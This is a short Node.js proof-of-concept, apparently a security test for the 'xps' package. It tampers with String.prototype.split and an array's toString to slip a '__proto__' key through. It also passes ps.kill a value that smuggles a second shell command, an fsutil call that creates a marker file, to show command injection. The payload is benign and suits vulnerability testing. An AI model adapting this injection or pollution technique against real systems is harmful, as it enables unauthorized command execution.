var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const ps = require('xps');
const fs = require('fs');
const path = './xps';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
ps.kill('\'\' & fsutil file createnew xps 0').fork(() => {
}, () => {
    const file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, () => {
    });
});